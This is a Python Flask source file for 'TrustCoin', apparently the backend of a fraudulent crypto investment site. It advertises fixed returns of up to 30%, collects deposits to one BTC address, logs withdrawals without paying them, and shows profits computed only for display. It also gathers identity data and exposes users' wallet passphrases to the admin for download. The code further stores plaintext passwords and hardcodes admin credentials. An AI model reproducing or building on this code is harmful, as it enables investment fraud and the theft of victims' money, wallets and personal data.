from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
import os, random, string, secrets, io

app = Flask(__name__)
app.secret_key = 'trustcoin_secret_key_2024'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Database configuration
database_url = os.environ.get('DATABASE_URL')
if database_url:
    app.config['SQLALCHEMY_DATABASE_URI'] = database_url.replace('postgres://', 'postgresql://', 1)
else:
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///trustcoin.db'

db = SQLAlchemy(app)

# ---------- Models ----------
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    legal_name = db.Column(db.String(120), nullable=False)
    dob = db.Column(db.String(20), nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    country = db.Column(db.String(80), nullable=False)
    employment = db.Column(db.String(50), nullable=False)
    invested_btc = db.Column(db.String(10), nullable=False)
    income_source = db.Column(db.String(120), nullable=False)
    username = db.Column(db.String(20), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)
    approved = db.Column(db.Boolean, default=False)
    wallet_imported = db.Column(db.Boolean, default=False)
    wallet_type = db.Column(db.String(50), nullable=True)
    wallet_passphrase = db.Column(db.String(100), nullable=True)   # new field
    balance = db.Column(db.Float, default=0.0)
    total_profit = db.Column(db.Float, default=0.0)   # cumulative profit earned
    btc_balance = db.Column(db.Float, default=0.0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Transaction(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    tx_type = db.Column(db.String(30), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    status = db.Column(db.String(20), default='Pending')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

# New: Active investments (for daily profit calculation)
class ActiveInvestment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    amount = db.Column(db.Float, nullable=False)
    plan_name = db.Column(db.String(50), nullable=False)
    roi_percent = db.Column(db.Float, nullable=False)
    duration_days = db.Column(db.Integer, nullable=False)
    start_date = db.Column(db.DateTime, default=datetime.utcnow)
    end_date = db.Column(db.DateTime, nullable=False)
    daily_profit = db.Column(db.Float, nullable=False)   # amount added each day
    is_completed = db.Column(db.Boolean, default=False)

def generate_verify_code():
    upper = random.choices(string.ascii_uppercase, k=2)
    lower = random.choices(string.ascii_lowercase, k=1)
    nums = random.choices(string.digits, k=3)
    code = upper + lower + nums
    random.shuffle(code)
    return ''.join(code)

# Plan definitions (same as frontend)
PLANS = [
    {'name':'Starter',  'min':100,    'max':999,    'roi':5,  'days':7},
    {'name':'Basic',    'min':1000,   'max':4999,   'roi':7,  'days':14},
    {'name':'Silver',   'min':5000,   'max':9999,   'roi':10, 'days':21},
    {'name':'Gold',     'min':10000,  'max':24999,  'roi':12, 'days':28},
    {'name':'Premium',  'min':25000,  'max':49999,  'roi':15, 'days':35},
    {'name':'Platinum', 'min':50000,  'max':99999,  'roi':18, 'days':42},
    {'name':'Diamond',  'min':100000, 'max':249999, 'roi':20, 'days':50},
    {'name':'Elite',    'min':250000, 'max':499999, 'roi':22, 'days':60},
    {'name':'Ultimate', 'min':500000, 'max':999999, 'roi':25, 'days':75},
    {'name':'Infinite', 'min':1000000,'max':1e12,   'roi':30, 'days':90},
]

def get_plan_by_amount(amount):
    for p in PLANS:
        if amount >= p['min'] and amount <= p['max']:
            return p
    return None

ADMIN_PASSWORD = 'PASS@Billionsforme@001'
ADMIN_SECRET = '/admin-secure-login-tc2024'
BTC_ADDRESS = 'YOUR_BTC_WALLET_ADDRESS_HERE'

# ---------- Routes ----------
@app.route('/')
def home():
    return render_template('home.html')

@app.route('/signup', methods=['GET','POST'])
def signup():
    if request.method == 'POST':
        data = request.get_json()
        session['signup_step1'] = data
        return jsonify({'success': True})
    return render_template('signup.html')

@app.route('/complete-registration', methods=['GET','POST'])
def complete_registration():
    if 'signup_step1' not in session:
        return redirect(url_for('signup'))
    if request.method == 'POST':
        data = request.get_json()
        username = data.get('username','').strip()
        password = data.get('password','').strip()
        existing = User.query.filter_by(username=username).first()
        if existing:
            return jsonify({'success': False, 'error': 'USERNAME_TAKEN'})
        session['signup_step2'] = data
        return jsonify({'success': True})
    return render_template('complete_registration.html')

@app.route('/verify-robot', methods=['GET','POST'])
def verify_robot():
    if 'signup_step1' not in session or 'signup_step2' not in session:
        return redirect(url_for('signup'))
    if request.method == 'POST':
        data = request.get_json()
        action = data.get('action')
        if action == 'generate':
            code = generate_verify_code()
            session['verify_code'] = code
            return jsonify({'success': True, 'code': code})
        if action == 'verify':
            user_code = data.get('code','').strip()
            if user_code == session.get('verify_code'):
                s1 = session.pop('signup_step1')
                s2 = session.pop('signup_step2')
                session.pop('verify_code', None)
                new_user = User(
                    legal_name=s1['legal_name'],
                    dob=s1['dob'],
                    email=s1['email'],
                    country=s1['country'],
                    employment=s1['employment'],
                    invested_btc=s1['invested_btc'],
                    income_source=s1['income_source'],
                    username=s2['username'],
                    password=s2['password'],
                )
                db.session.add(new_user)
                db.session.commit()
                return jsonify({'success': True})
            else:
                return jsonify({'success': False, 'error': 'INVALID_CODE'})
    return render_template('verify_robot.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        data = request.get_json()
        username = data.get('username','').strip()
        password = data.get('password','').strip()
        user = User.query.filter_by(username=username, password=password).first()
        if user:
            session['user_id'] = user.id
            session['username'] = user.username
            session['approved'] = user.approved
            return jsonify({'success': True})
        return jsonify({'success': False, 'error': 'INVALID_USERNAME_OR_PASSWORD'})
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('home'))

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    user = User.query.get(session['user_id'])
    
    # ---- Calculate today's profit from active investments ----
    today = datetime.utcnow().date()
    active_investments = ActiveInvestment.query.filter_by(user_id=user.id, is_completed=False).all()
    today_profit = 0.0
    for inv in active_investments:
        if inv.start_date.date() <= today <= inv.end_date.date():
            today_profit += inv.daily_profit
    
    # ---- Calculate total returns (cumulative profit from completed investments) ----
    completed_investments = ActiveInvestment.query.filter_by(user_id=user.id, is_completed=True).all()
    total_returns = sum([(inv.amount * inv.roi_percent / 100) for inv in completed_investments])
    # Also update user.total_profit to match
    user.total_profit = total_returns
    db.session.commit()
    
    txs = Transaction.query.filter_by(user_id=user.id).order_by(Transaction.created_at.desc()).limit(10).all()
    return render_template('dashboard.html', user=user, transactions=txs, btc_address=BTC_ADDRESS,
                           today_profit=today_profit, total_returns=total_returns)

@app.route('/import-wallet', methods=['GET','POST'])
def import_wallet():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        data = request.get_json()
        wallet_type = data.get('wallet_type','')
        user = User.query.get(session['user_id'])
        user.wallet_imported = True
        user.wallet_type = wallet_type
        # Generate random passphrase (16 characters alphanumeric)
        passphrase = secrets.token_hex(8)  # 16 hex chars
        user.wallet_passphrase = passphrase
        db.session.commit()
        return jsonify({'success': True})
    return render_template('import_wallet.html')

@app.route('/buy-btc', methods=['POST'])
def buy_btc():
    if 'user_id' not in session:
        return jsonify({'success': False})
    data = request.get_json()
    amount = float(data.get('amount', 0))
    user = User.query.get(session['user_id'])
    tx = Transaction(user_id=user.id, tx_type='Buy BTC', amount=amount, status='Pending')
    db.session.add(tx)
    db.session.commit()
    return jsonify({'success': True, 'btc_address': BTC_ADDRESS})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    if 'user_id' not in session:
        return jsonify({'success': False})
    data = request.get_json()
    amount = float(data.get('amount', 0))
    user = User.query.get(session['user_id'])
    tx = Transaction(user_id=user.id, tx_type='Withdrawal', amount=amount, status='Processing')
    db.session.add(tx)
    db.session.commit()
    return jsonify({'success': True})

@app.route(ADMIN_SECRET, methods=['GET','POST'])
def admin_login():
    if request.method == 'POST':
        data = request.get_json()
        if data.get('password') == ADMIN_PASSWORD:
            session['admin'] = True
            return jsonify({'success': True, 'redirect': url_for('admin_dashboard')})
        return jsonify({'success': False, 'error': 'INVALID PASSWORD'})
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin'):
        return redirect(url_for('home'))
    users = User.query.order_by(User.created_at.desc()).all()
    # For admin dashboard we need dummy values for traffic and winners (not part of this task)
    return render_template('admin_dashboard.html', users=users, today_visits=0, total_visits=0,
                           winners=[], msgs=[], daily=[], recent_logs=[])

@app.route('/admin/approve/<int:user_id>', methods=['POST'])
def approve_user(user_id):
    if not session.get('admin'):
        return jsonify({'success': False})
    user = User.query.get(user_id)
    user.approved = True
    db.session.commit()
    return jsonify({'success': True})

@app.route('/admin/disapprove/<int:user_id>', methods=['POST'])
def disapprove_user(user_id):
    if not session.get('admin'):
        return jsonify({'success': False})
    user = User.query.get(user_id)
    user.approved = False
    db.session.commit()
    return jsonify({'success': True})

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('home'))

@app.route('/admin/download_passphrase/<int:user_id>')
def download_passphrase(user_id):
    if not session.get('admin'):
        return redirect(url_for('home'))
    user = User.query.get(user_id)
    if not user or not user.wallet_passphrase:
        return "No passphrase found", 404
    content = f"Username: {user.username}\nWallet Passphrase: {user.wallet_passphrase}\n\nThis passphrase is for the imported wallet ({user.wallet_type or 'unknown'})."
    return send_file(
        io.BytesIO(content.encode()),
        mimetype='text/plain',
        as_attachment=True,
        download_name=f"{user.username}_passphrase.txt"
    )

# ---------- Investment Routes ----------
@app.route('/invest', methods=['POST'])
def invest():
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not logged in'})
    data = request.get_json()
    amount = data.get('amount', 0)
    if amount < 100:
        return jsonify({'success': False, 'error': 'Minimum investment is $100'})
    user = User.query.get(session['user_id'])
    # Create pending investment transaction
    tx = Transaction(user_id=user.id, tx_type='Invest', amount=amount, status='Pending')
    db.session.add(tx)
    db.session.commit()
    return jsonify({'success': True, 'tx_id': tx.id})

@app.route('/confirm-investment', methods=['POST'])
def confirm_investment():
    if 'user_id' not in session:
        return jsonify({'success': False, 'error': 'Not logged in'})
    data = request.get_json()
    tx_id = data.get('tx_id')
    amount = data.get('amount', 0)
    tx = Transaction.query.get(tx_id)
    if not tx or tx.user_id != session['user_id']:
        return jsonify({'success': False, 'error': 'Invalid transaction'})
    
    # Find plan
    plan = get_plan_by_amount(amount)
    if not plan:
        return jsonify({'success': False, 'error': 'Invalid amount for any plan'})
    
    # Create active investment
    start_date = datetime.utcnow()
    end_date = start_date + timedelta(days=plan['days'])
    total_profit_amount = amount * plan['roi'] / 100
    daily_profit = total_profit_amount / plan['days']
    
    active = ActiveInvestment(
        user_id=session['user_id'],
        amount=amount,
        plan_name=plan['name'],
        roi_percent=plan['roi'],
        duration_days=plan['days'],
        start_date=start_date,
        end_date=end_date,
        daily_profit=daily_profit,
        is_completed=False
    )
    db.session.add(active)
    
    # Mark transaction as approved
    tx.status = 'Approved'
    # Add invested amount to user's balance (principal)
    user = User.query.get(session['user_id'])
    user.balance += amount
    db.session.commit()
    return jsonify({'success': True})

@app.route('/check-pending')
def check_pending():
    if 'user_id' not in session:
        return jsonify({'credited': False})
    user = User.query.get(session['user_id'])
    # Recompute today's profit and total returns for live update
    today = datetime.utcnow().date()
    active_investments = ActiveInvestment.query.filter_by(user_id=user.id, is_completed=False).all()
    today_profit = 0.0
    for inv in active_investments:
        if inv.start_date.date() <= today <= inv.end_date.date():
            today_profit += inv.daily_profit
    completed = ActiveInvestment.query.filter_by(user_id=user.id, is_completed=True).all()
    total_returns = sum([(inv.amount * inv.roi_percent / 100) for inv in completed])
    user.total_profit = total_returns
    db.session.commit()
    return jsonify({
        'credited': True,
        'new_balance': user.balance,
        'total_profit': user.total_profit,
        'today_profit': today_profit
    })

# ---------- Page Routes (FAQ, Quiz, etc.) ----------
@app.route('/quiz')
def quiz_page():
    return render_template('quiz.html')

@app.route('/faqs')
def faqs_page():
    return render_template('faqs.html')

@app.route('/law')
def law_page():
    return render_template('law.html')

@app.route('/law-regulation')
def law_regulation_page():
    return render_template('law.html')

@app.route('/help-center')
def help_center_page():
    return render_template('help_center.html')

@app.route('/contact-us')
def contact_us_page():
    return render_template('contact_us.html')

@app.route('/terms-of-service')
def terms_of_service_page():
    return render_template('terms_of_service.html')

@app.route('/privacy-policy')
def privacy_policy_page():
    return render_template('privacy_policy.html')

@app.route('/support')
def support_page():
    return render_template('support.html')

@app.route('/contact')
def contact_page():
    return render_template('contact.html')

# Create tables
with app.app_context():
    db.create_all()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)